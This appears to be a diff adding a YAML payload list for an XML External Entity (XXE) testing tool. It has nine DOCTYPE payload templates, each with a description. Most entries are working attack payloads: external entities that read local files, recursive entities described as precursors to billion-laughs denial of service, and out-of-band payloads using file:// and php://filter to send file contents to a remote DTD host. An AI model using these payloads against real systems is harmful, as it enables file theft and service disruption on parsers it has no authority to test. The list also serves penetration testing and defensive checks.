@@ -1,0 +1,36 @@
+- name: remote-dtd-public-check
+  long: Remote DTD public check
+  payload: '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/FILE">'
+  description: "A Remote DTD causes the XML parser to make an external connection when successful."
+- name: canary-xml-entity
+  long: Canary XML Entity
+  payload: '<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>'
+  description: "Checks if the application rejects a file with an entity included. No malicious use."
+- name: plain-external-xml-entity
+  long: Plain External XML Entity
+  payload: '<!DOCTYPE root [<!ENTITY xxe SYSTEM "FILE">]>'
+  description: "A simple external XML entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE."
+- name: recursive-xml-entity
+  long: Recursive XML Entity
+  payload: '<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>'
+  description: "A recursive XML Entity. This is a precursor check to the billion laughs attack."
+- name: canary-parameter-entity
+  long: Canary Parameter Entity
+  payload: '<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>'
+  description: "A parameter entity check. This is valuable because the entity is checked immediately when the DOCTYPE is parsed. No malicious application but useful to check for."
+- name: plain-external-parameter-entity
+  long: Plain External Parameter Entity
+  payload: '<!DOCTYPE root [<!ENTITY % a SYSTEM "FILE"> %a;]>'
+  description: "A simple external parameter entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE. Useful because the entity is checked immediately when the DOCTYPE is parsed. "
+- name: recursive-parameter-entity
+  long: Recursive Parameter Entity
+  payload: '<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>'
+  description: "Technically recursive parameter entities are not allowed by the XML spec. Should never work. Precursor to the billion laughs attack."
+- name: out-of-bounds-attack-using-file
+  long: Out of Bounds Attack (using file://)
+  payload: '<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % dtd SYSTEM "IP">%dtd;]>'
+  description: "OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the file:// protocol. Details about building the dtd file at https://portswigger.net/web-security/xxe/blind."
+- name: out-of-bounds-attack-using-php-filter
+  long: Out of Bounds Attack (using php://filter)
+  payload: '<!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=FILE"><!ENTITY % dtd SYSTEM "IP">%dtd;]>'
+  description: "OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the php filter \"convert.base64-encode\", which has been available since PHP 5.0.0. See References."
